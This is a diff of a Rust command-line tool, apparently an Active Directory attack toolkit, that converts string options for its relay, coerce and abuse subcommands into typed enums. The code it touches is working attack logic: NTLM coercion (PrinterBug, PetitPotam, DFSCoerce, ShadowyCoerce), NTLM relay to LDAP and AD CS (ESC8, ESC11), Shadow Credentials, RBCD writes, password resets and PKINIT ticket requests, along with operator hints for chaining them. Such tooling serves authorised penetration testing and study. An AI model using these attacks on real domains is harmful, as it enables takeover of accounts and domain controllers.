@@ -727,6 +727,24 @@ struct ExecArgs {
     command: String,
 }
 
+/// Post-relay write action for `attack relay`.
+///
+/// This is the *CLI selector* for what to do with the relayed victim's
+/// session; the internal data-carrying enum below is [`RelayAction`],
+/// which additionally carries resolved CA host/port/template/insecure
+/// for the ADCS/ICPR variants.
+#[derive(clap::ValueEnum, Clone, Copy, Debug, PartialEq, Eq)]
+pub enum RelayTarget {
+    /// Shadow Credentials: write msDS-KeyCredentialLink on the target object.
+    LdapKeycred,
+    /// RBCD: write msDS-AllowedToActOnBehalfOfOtherIdentity on the target object.
+    LdapRbcd,
+    /// ESC8: HTTP relay to AD CS web enrollment — needs --ca-host.
+    AdcsHttp,
+    /// ESC11: relay to MS-ICPR over ncacn_ip_tcp — needs --ca-host.
+    Icpr,
+}
+
 #[derive(Parser)]
 struct RelayArgs {
     /// SMB address to receive the coerced/poisoned victim on
@@ -743,8 +761,8 @@ struct RelayArgs {
     target_object: String,
     /// Relay target: `ldap-keycred` (Shadow Cred), `ldap-rbcd` (RBCD write),
     /// `adcs-http` (ESC8), `icpr` (ESC11) — both need --ca-host.
-    #[arg(long, default_value = "ldap-keycred")]
-    target: String,
+    #[arg(long, value_enum, default_value_t = RelayTarget::LdapKeycred)]
+    target: RelayTarget,
     /// For `ldap-rbcd`: SID of the account we control that will be granted delegation rights
     /// (typically a computer account we created — required if --target=ldap-rbcd).
     #[arg(long)]
@@ -914,6 +932,26 @@ struct RbcdArgs {
     target_spn: String,
 }
 
+/// Coercion vector (pipe) selection for `attack coerce`.
+///
+/// Renamed from a bare `--pipe <string>` in 1.3.10 — clap now rejects
+/// unknown values at parse time with a helpful list, instead of silently
+/// forwarding through to `smb.open_pipe` where the failure surfaces as a
+/// generic RPC fault a hundred lines later.
+#[derive(clap::ValueEnum, Clone, Copy, Debug, PartialEq, Eq)]
+enum CoercePipe {
+    /// PrinterBug (MS-RPRN over \spoolss) — most reliable coercion on modern DCs.
+    Spoolss,
+    /// PetitPotam (MS-EFSR over \lsarpc) — restricted on Server 2016+ hardened DCs.
+    Lsarpc,
+    /// PetitPotam (MS-EFSR over \efsrpc) — restricted on Server 2016+ hardened DCs.
+    Efsrpc,
+    /// DFSCoerce (MS-DFSNM NetrDfsAddStdRoot over \netdfs).
+    Netdfs,
+    /// ShadowyCoerce (MS-FSRVP IsPathSupported over \FssagentRpc) — needs FS-VSS-Agent role.
+    Fssagentrpc,
+}
+
 #[derive(Parser)]
 struct CoerceArgs {
     #[arg(long)]
@@ -930,11 +968,32 @@ struct CoerceArgs {
     /// Coercion vector (pipe name): spoolss (PrinterBug, MS-RPRN — most reliable on modern
     /// DCs), lsarpc / efsrpc (PetitPotam, MS-EFSR — restricted on 2016+), netdfs (DFSCoerce,
     /// MS-DFSNM), fssagentrpc (ShadowyCoerce, MS-FSRVP — needs FS-VSS-Agent role).
-    #[arg(long, default_value = "spoolss")]
-    pipe: String,
+    #[arg(long, value_enum, ignore_case = true, default_value = "spoolss")]
+    pipe: CoercePipe,
     /// PrinterBug server name to open (defaults to --host; modern spoolers want the hostname/FQDN, not an IP)
     #[arg(long)]
     target: Option<String>,
+}
+
+/// LDAP-write / KDC abuse action for `attack abuse`.
+///
+/// Replaced a bare `--action <string>` in 1.3.10 — clap now rejects unknown
+/// actions at parse time instead of running an LDAP bind first only to fail
+/// with "unknown action 'foo'" later.
+#[derive(clap::ValueEnum, Clone, Copy, Debug, PartialEq, Eq)]
+pub enum AbuseAction {
+    /// Add a servicePrincipalName to the target → makes it Kerberoastable.
+    AddSpn,
+    /// Add the given user to the target group.
+    AddMember,
+    /// Reset the target account's password (requires LDAPS or --gssapi sealing).
+    SetPassword,
+    /// Shadow Credentials: add a KeyCredential to msDS-KeyCredentialLink.
+    AddKeycred,
+    /// Write RBCD: allow --value to impersonate to the target (msDS-AllowedToActOnBehalfOfOtherIdentity).
+    WriteRbcd,
+    /// PKINIT with a previously issued Shadow Credentials key → TGT as the target account.
+    Pkinit,
 }
 
 #[derive(Parser)]
@@ -948,9 +1007,9 @@ struct AbuseArgs {
     password: Option<String>,
     #[arg(long)]
     insecure: bool,
-    /// add-spn | add-member | set-password | add-keycred | write-rbcd | pkinit
+    /// Which abuse to perform.
     #[arg(long)]
-    action: String,
+    action: AbuseAction,
     /// Target sAMAccountName (the object to modify; the group for add-member; the account
     /// to authenticate as for `pkinit`)
     #[arg(long)]
@@ -2576,103 +2635,104 @@ async fn coerce(mut a: CoerceArgs) -> Result<()> {
     smb.login(&a.host, &a.domain, &a.user, &a.password).await?;
     smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
 
-    if a.pipe.eq_ignore_ascii_case("spoolss") {
-        // PrinterBug (MS-RPRN): open a printer on the target, then RFFPCNEx → callback to us.
-        use dcerpc::rprn::{printerbug_tcp, PrinterBug};
-        // Try the \spoolss SMB pipe first; modern spoolers only expose ncacn_ip_tcp (via EPM).
-        let target = a.target.clone().unwrap_or_else(|| a.host.clone());
-        let via_pipe = match smb.open_pipe("spoolss").await {
-            Ok(pipe) => {
-                let mut client = PrinterBug::bind(&mut smb, pipe).await?;
-                Some(client.coerce(&target, &a.listener).await)
-            }
-            Err(_) => None,
-        };
-        let result = match via_pipe {
-            Some(r) => r,
-            None => {
-                printerbug_tcp(
-                    &a.host,
-                    &a.domain,
-                    &a.user,
-                    &a.password,
-                    &target,
-                    &a.listener,
-                )
-                .await
-            }
-        };
-        match result {
-            Ok(status) => {
-                println!("[+] PrinterBug (RFFPCNEx) accepted — status {status:#010x}");
-                println!("    {} spooler attempted auth to \\\\{}\\... (run a relay/listener to capture)", a.host, a.listener);
-            }
-            Err(e) => {
-                println!("[-] PrinterBug failed/patched (spooler off or remote RPC blocked): {e}")
+    match a.pipe {
+        CoercePipe::Spoolss => {
+            // PrinterBug (MS-RPRN): open a printer on the target, then RFFPCNEx → callback to us.
+            use dcerpc::rprn::{printerbug_tcp, PrinterBug};
+            // Try the \spoolss SMB pipe first; modern spoolers only expose ncacn_ip_tcp (via EPM).
+            let target = a.target.clone().unwrap_or_else(|| a.host.clone());
+            let via_pipe = match smb.open_pipe("spoolss").await {
+                Ok(pipe) => {
+                    let mut client = PrinterBug::bind(&mut smb, pipe).await?;
+                    Some(client.coerce(&target, &a.listener).await)
+                }
+                Err(_) => None,
+            };
+            let result = match via_pipe {
+                Some(r) => r,
+                None => {
+                    printerbug_tcp(
+                        &a.host,
+                        &a.domain,
+                        &a.user,
+                        &a.password,
+                        &target,
+                        &a.listener,
+                    )
+                    .await
+                }
+            };
+            match result {
+                Ok(status) => {
+                    println!("[+] PrinterBug (RFFPCNEx) accepted — status {status:#010x}");
+                    println!("    {} spooler attempted auth to \\\\{}\\... (run a relay/listener to capture)", a.host, a.listener);
+                }
+                Err(e) => {
+                    println!("[-] PrinterBug failed/patched (spooler off or remote RPC blocked): {e}")
+                }
             }
         }
-        return Ok(());
-    }
-
-    // MS-DFSNM (DFSCoerce): NetrDfsAddStdRoot over \netdfs — makes the DC auth to ServerName.
-    if a.pipe.eq_ignore_ascii_case("netdfs") {
-        use dcerpc::dfsnm::CoerceClient as DfsClient;
-        let pipe = smb.open_pipe("netdfs").await?;
-        let mut client =
-            DfsClient::bind_sealed(&mut smb, pipe, &a.domain, &a.user, &a.password, &a.host)
-                .await?;
-        match client.coerce(&a.listener).await {
-            Ok(status) => {
-                println!("[+] NetrDfsAddStdRoot accepted via \\netdfs — status {status:#010x}");
-                println!("    DC {} attempted auth to \\\\{}\\... (run a relay/listener to capture)", a.host, a.listener);
+        CoercePipe::Netdfs => {
+            // MS-DFSNM (DFSCoerce): NetrDfsAddStdRoot over \netdfs — makes the DC auth to ServerName.
+            use dcerpc::dfsnm::CoerceClient as DfsClient;
+            let pipe = smb.open_pipe("netdfs").await?;
+            let mut client =
+                DfsClient::bind_sealed(&mut smb, pipe, &a.domain, &a.user, &a.password, &a.host)
+                    .await?;
+            match client.coerce(&a.listener).await {
+                Ok(status) => {
+                    println!("[+] NetrDfsAddStdRoot accepted via \\netdfs — status {status:#010x}");
+                    println!("    DC {} attempted auth to \\\\{}\\... (run a relay/listener to capture)", a.host, a.listener);
+                }
+                Err(e) => println!(
+                    "[-] DFSCoerce failed on this DC ({e}) — try `--pipe spoolss` (PrinterBug); netdfs is picky about transport/auth-level on modern Windows"
+                ),
             }
-            Err(e) => println!(
-                "[-] DFSCoerce failed on this DC ({e}) — try `--pipe spoolss` (PrinterBug); netdfs is picky about transport/auth-level on modern Windows"
-            ),
         }
-        return Ok(());
-    }
-
-    // MS-FSRVP (ShadowyCoerce): IsPathSupported over \FssagentRpc — makes the VSS provider
-    // auth to ShareName. Needs the File Server VSS Agent Service enabled.
-    if a.pipe.eq_ignore_ascii_case("fssagentrpc") {
-        use dcerpc::fsrvp::CoerceClient as VssClient;
-        let pipe = smb.open_pipe("FssagentRpc").await?;
-        let mut client =
-            VssClient::bind_sealed(&mut smb, pipe, &a.domain, &a.user, &a.password, &a.host)
-                .await?;
-        match client.coerce(&a.listener).await {
-            Ok(status) => {
-                println!("[+] IsPathSupported accepted via \\FssagentRpc — status {status:#010x}");
-                println!("    {} VSS provider attempted auth to \\\\{}\\... (run a relay/listener to capture)", a.host, a.listener);
+        CoercePipe::Fssagentrpc => {
+            // MS-FSRVP (ShadowyCoerce): IsPathSupported over \FssagentRpc — makes the VSS provider
+            // auth to ShareName. Needs the File Server VSS Agent Service enabled.
+            use dcerpc::fsrvp::CoerceClient as VssClient;
+            let pipe = smb.open_pipe("FssagentRpc").await?;
+            let mut client =
+                VssClient::bind_sealed(&mut smb, pipe, &a.domain, &a.user, &a.password, &a.host)
+                    .await?;
+            match client.coerce(&a.listener).await {
+                Ok(status) => {
+                    println!("[+] IsPathSupported accepted via \\FssagentRpc — status {status:#010x}");
+                    println!("    {} VSS provider attempted auth to \\\\{}\\... (run a relay/listener to capture)", a.host, a.listener);
+                }
+                Err(e) => println!(
+                    "[-] ShadowyCoerce failed ({e}) — needs FS-VSS-Agent role installed AND Backup Operators rights; try `--pipe spoolss` for a reliable alternative"
+                ),
             }
-            Err(e) => println!(
-                "[-] ShadowyCoerce failed ({e}) — needs FS-VSS-Agent role installed AND Backup Operators rights; try `--pipe spoolss` for a reliable alternative"
-            ),
         }
-        return Ok(());
-    }
-
-    // MS-EFSR (PetitPotam) over \lsarpc or \efsrpc.
-    use dcerpc::efsr::CoerceClient;
-    let pipe = smb.open_pipe(&a.pipe).await?;
-    let mut client =
-        CoerceClient::bind_sealed(&mut smb, pipe, &a.domain, &a.user, &a.password, &a.host).await?;
-    match client.coerce(&a.listener).await {
-        Ok(status) => {
-            println!(
-                "[+] EfsRpcOpenFileRaw accepted via \\{} — status {status:#010x}",
-                a.pipe
-            );
-            println!(
-                "    DC {} attempted auth to \\\\{}\\... (run a relay/listener to capture)",
-                a.host, a.listener
-            );
+        CoercePipe::Lsarpc | CoercePipe::Efsrpc => {
+            // MS-EFSR (PetitPotam) over \lsarpc or \efsrpc.
+            use dcerpc::efsr::CoerceClient;
+            let pipe_name = match a.pipe {
+                CoercePipe::Lsarpc => "lsarpc",
+                CoercePipe::Efsrpc => "efsrpc",
+                _ => unreachable!(),
+            };
+            let pipe = smb.open_pipe(pipe_name).await?;
+            let mut client =
+                CoerceClient::bind_sealed(&mut smb, pipe, &a.domain, &a.user, &a.password, &a.host).await?;
+            match client.coerce(&a.listener).await {
+                Ok(status) => {
+                    println!(
+                        "[+] EfsRpcOpenFileRaw accepted via \\{pipe_name} — status {status:#010x}"
+                    );
+                    println!(
+                        "    DC {} attempted auth to \\\\{}\\... (run a relay/listener to capture)",
+                        a.host, a.listener
+                    );
+                }
+                Err(e) => println!(
+                    "[-] EFSR via \\{pipe_name} failed ({e}) — MS-EFSR is restricted/removed on Server 2016+ hardening; use `--pipe spoolss` (PrinterBug) instead"
+                ),
+            }
         }
-        Err(e) => println!(
-            "[-] EFSR via \\{} failed ({e}) — MS-EFSR is restricted/removed on Server 2016+ hardening; use `--pipe spoolss` (PrinterBug) instead",
-            a.pipe
-        ),
     }
     Ok(())
 }
@@ -2687,7 +2747,7 @@ async fn abuse(mut a: AbuseArgs) -> Result<()> {
         }
     }
     // pkinit is a KDC exchange, not an LDAP write — handle it before touching LDAP.
-    if a.action == "pkinit" {
+    if a.action == AbuseAction::Pkinit {
         let realm = a.realm.clone().context("pkinit needs --realm")?;
         let kdc = a.kdc.clone().context("pkinit needs --kdc")?;
         let key_path = if a.value.is_empty() {
@@ -2756,17 +2816,17 @@ async fn abuse(mut a: AbuseArgs) -> Result<()> {
     let mut c = Collector::connect(&cfg).await?;
     let target_dn = c.resolve_dn(&a.target).await?;
 
-    match a.action.as_str() {
-        "add-spn" => {
+    match a.action {
+        AbuseAction::AddSpn => {
             c.add_value(&target_dn, "servicePrincipalName", &a.value).await?;
             println!("[+] added SPN '{}' to {} — now Kerberoastable", a.value, a.target);
         }
-        "add-member" => {
+        AbuseAction::AddMember => {
             let member_dn = c.resolve_dn(&a.value).await?;
             c.add_value(&target_dn, "member", &member_dn).await?;
             println!("[+] added {} to group {}", a.value, a.target);
         }
-        "set-password" => {
+        AbuseAction::SetPassword => {
             // AD refuses `unicodePwd` writes on an unencrypted channel — save the user a
             // WILL_NOT_PERFORM roundtrip by front-checking the URL and telling them why.
             let url = a.url.as_deref().unwrap_or("");
@@ -2780,7 +2840,7 @@ async fn abuse(mut a: AbuseArgs) -> Result<()> {
             c.set_password(&target_dn, &a.value).await?;
             println!("[+] reset password of {}", a.target);
         }
-        "add-keycred" => {
+        AbuseAction::AddKeycred => {
             // Shadow Credentials: add a KeyCredential to the target's msDS-KeyCredentialLink.
             let kc = adhammer_kerberos::shadowcred::build_key_credential(&target_dn)?;
             c.add_value(&target_dn, "msDS-KeyCredentialLink", &kc.dn_binary).await?;
@@ -2789,7 +2849,7 @@ async fn abuse(mut a: AbuseArgs) -> Result<()> {
             println!("[+] added Shadow Credential to {} — key saved to {key_path}", a.target);
             println!("    (Phase 2: PKINIT with this key to obtain a TGT as {})", a.target);
         }
-        "write-rbcd" => {
+        AbuseAction::WriteRbcd => {
             // value = SID (S-1-...) or sAMAccountName of the principal to grant delegation.
             let trustee = if a.value.starts_with("S-") {
                 adhammer_core::sid::Sid::parse(&a.value).context("bad SID")?
@@ -2800,7 +2860,7 @@ async fn abuse(mut a: AbuseArgs) -> Result<()> {
             c.write_binary(&target_dn, "msDS-AllowedToActOnBehalfOfOtherIdentity", sd).await?;
             println!("[+] wrote RBCD on {} allowing {} to impersonate to it", a.target, a.value);
         }
-        other => anyhow::bail!("unknown action '{other}' (add-spn|add-member|set-password|write-rbcd|add-keycred|pkinit)"),
+        AbuseAction::Pkinit => unreachable!("pkinit handled above the LDAP-connect block"),
     }
     Ok(())
 }
@@ -2982,8 +3042,12 @@ const SERVICES: &[(u16, &str)] = &[
 const GREETERS: &[u16] = &[21, 22, 25, 110, 143];
 
 /// One of the write-actions the relay can perform once it has an LDAP session as the victim.
+///
+/// Internal / data-carrying twin of the CLI-facing [`RelayTarget`] value_enum:
+/// the CLI parses the selector, then this enum carries the resolved
+/// CA host/port/template/insecure into the spawn loop.
 #[derive(Clone, Debug)]
-enum RelayTarget {
+enum RelayAction {
     /// Write msDS-KeyCredentialLink on `target_object` (shadow credentials → PKINIT).
     LdapKeycred,
     /// Write msDS-AllowedToActOnBehalfOfOtherIdentity on `target_object` (RBCD → S4U2Proxy).
@@ -3000,33 +3064,30 @@ async fn relay(a: RelayArgs) -> Result<()> {
     use smb2_client::server::RelayConn;
 
     // Resolve --target early so the user gets a clear error before the listener is up.
-    let (target, trustee_sid) = match a.target.as_str() {
-        "ldap-keycred" => (RelayTarget::LdapKeycred, None),
-        "ldap-rbcd" => {
+    let (target, trustee_sid) = match a.target {
+        RelayTarget::LdapKeycred => (RelayAction::LdapKeycred, None),
+        RelayTarget::LdapRbcd => {
             let sid = a.trustee_sid.clone().ok_or_else(|| {
                 anyhow::anyhow!(
                     "--target ldap-rbcd requires --trustee-sid <SID of a controlled account>"
                 )
             })?;
-            (RelayTarget::LdapRbcd, Some(sid))
+            (RelayAction::LdapRbcd, Some(sid))
         }
-        "adcs-http" => {
+        RelayTarget::AdcsHttp => {
             let ca = a.ca_host.clone().ok_or_else(|| {
                 anyhow::anyhow!("--target adcs-http requires --ca-host <ca.corp.local>")
             })?;
             (
-                RelayTarget::AdcsHttp(ca, a.ca_port, a.ca_template.clone(), a.ca_insecure),
+                RelayAction::AdcsHttp(ca, a.ca_port, a.ca_template.clone(), a.ca_insecure),
                 None,
             )
         }
-        "icpr" => {
+        RelayTarget::Icpr => {
             let ca = a.ca_host.clone().ok_or_else(|| {
                 anyhow::anyhow!("--target icpr requires --ca-host <ca.corp.local>")
             })?;
-            (RelayTarget::Icpr(ca, a.ca_template.clone()), None)
-        }
-        other => {
-            anyhow::bail!("unknown --target {other} (ldap-keycred | ldap-rbcd | adcs-http | icpr)")
+            (RelayAction::Icpr(ca, a.ca_template.clone()), None)
         }
     };
 
@@ -3076,7 +3137,7 @@ async fn relay_one(
     target_dc: &str,
     base: &str,
     target_object: &str,
-    target: RelayTarget,
+    target: RelayAction,
     trustee_sid: Option<&str>,
 ) -> Result<()> {
     use smb2_client::server::RelayConn;
@@ -3084,7 +3145,7 @@ async fn relay_one(
     let type1 = rc.recv_type1().await?;
 
     // ESC8 relay: HTTP not LDAP, so branch off before opening the LDAP client.
-    if let RelayTarget::AdcsHttp(ref ca_host, port, ref template, insecure) = target {
+    if let RelayAction::AdcsHttp(ref ca_host, port, ref template, insecure) = target {
         return relay_esc8(
             rc,
             type1,
@@ -3098,7 +3159,7 @@ async fn relay_one(
         .await;
     }
     // ESC11 relay: ncacn_ip_tcp to MS-ICPR — NTLM auth handshake, then unsealed CertServerRequest.
-    if let RelayTarget::Icpr(ref ca_host, ref template) = target {
+    if let RelayAction::Icpr(ref ca_host, ref template) = target {
         return relay_icpr(rc, type1, peer, target_object, ca_host, template).await;
     }
 
@@ -3112,10 +3173,10 @@ async fn relay_one(
     let dn = ld.find_dn(base, target_object).await?;
 
     match target {
-        RelayTarget::AdcsHttp(_, _, _, _) | RelayTarget::Icpr(_, _) => {
+        RelayAction::AdcsHttp(_, _, _, _) | RelayAction::Icpr(_, _) => {
             unreachable!("handled above")
         }
-        RelayTarget::LdapKeycred => {
+        RelayAction::LdapKeycred => {
             let kc = adhammer_kerberos::shadowcred::build_key_credential(&dn)?;
             ld.modify_add(&dn, "msDS-KeyCredentialLink", kc.dn_binary.as_bytes())
                 .await?;
@@ -3123,7 +3184,7 @@ async fn relay_one(
             println!("[+] Shadow Credential written on {dn} — key {target_object}.key.pem");
             println!("    → attack abuse --action pkinit --target {target_object} --realm <realm> --kdc {target_dc}");
         }
-        RelayTarget::LdapRbcd => {
+        RelayAction::LdapRbcd => {
             let trustee = trustee_sid.expect("checked in relay(): --trustee-sid required");
             let trustee = windows_sddl::sid::Sid::parse(trustee)
                 .ok_or_else(|| anyhow::anyhow!("bad trustee SID: {trustee}"))?;
@@ -5064,7 +5125,7 @@ async fn shadowcred(a: ShadowcredArgs) -> Result<()> {
         user: Some(a.user.clone()),
         password: Some(a.password.clone()),
         insecure: a.insecure,
-        action: "add-keycred".into(),
+        action: AbuseAction::AddKeycred,
         target: a.target.clone(),
         value: String::new(),
         kdc: a.kdc.clone(),
@@ -5084,7 +5145,7 @@ async fn shadowcred(a: ShadowcredArgs) -> Result<()> {
             user: Some(a.user),
             password: Some(a.password),
             insecure: a.insecure,
-            action: "pkinit".into(),
+            action: AbuseAction::Pkinit,
             target: a.target,
             value: String::new(),
             kdc: Some(kdc),
